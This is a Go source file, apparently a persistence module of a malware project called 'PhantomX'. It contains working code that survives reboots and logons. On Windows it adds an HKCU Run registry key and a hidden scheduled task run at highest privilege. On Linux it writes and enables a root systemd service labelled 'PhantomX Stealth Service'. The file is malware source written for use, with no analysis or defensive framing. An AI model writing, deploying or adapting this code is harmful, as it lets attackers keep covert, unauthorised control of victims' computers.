package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

// Windows Registry Persistence
func addRegistryPersistence() {
	fmt.Println("[+] Adding registry persistence...")

	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println("[!] Failed to create registry key:", err)
		return
	}
	defer key.Close()

	exePath, _ := os.Executable()
	err = key.SetStringValue("PhantomX", exePath)
	if err != nil {
		fmt.Println("[!] Failed to set registry value:", err)
		return
	}

	fmt.Println("[+] Registry persistence added successfully!")
}

// Windows Scheduled Task Persistence
func addScheduledTask() {
	fmt.Println("[+] Adding Scheduled Task persistence...")

	exePath, _ := os.Executable()
	cmd := exec.Command("schtasks", "/create", "/tn", "PhantomX", "/tr", exePath, "/sc", "onlogon", "/rl", "highest")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Run()
	if err != nil {
		fmt.Println("[!] Failed to create Scheduled Task:", err)
		return
	}

	fmt.Println("[+] Scheduled Task persistence added!")
}

// Linux Systemd Persistence
func addSystemdPersistence() {
	fmt.Println("[+] Adding Systemd persistence...")

	serviceContent := `[Unit]
Description=PhantomX Stealth Service
After=network.target

[Service]
ExecStart=` + os.Args[0] + `
Restart=always
User=root

[Install]
WantedBy=multi-user.target`

	servicePath := "/etc/systemd/system/phantomx.service"
	err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
	if err != nil {
		fmt.Println("[!] Failed to write systemd service:", err)
		return
	}

	exec.Command("systemctl", "enable", "phantomx").Run()
	exec.Command("systemctl", "start", "phantomx").Run()

	fmt.Println("[+] Systemd persistence added!")
}

// Persistence Handler (Detect OS and Apply Persistence)
func EnablePersistence() {
	if runtime.GOOS == "windows" {
		addRegistryPersistence()
		addScheduledTask()
	} else if runtime.GOOS == "linux" {
		addSystemdPersistence()
	} else {
		fmt.Println("[!] Unsupported OS for persistence!")
	}
}
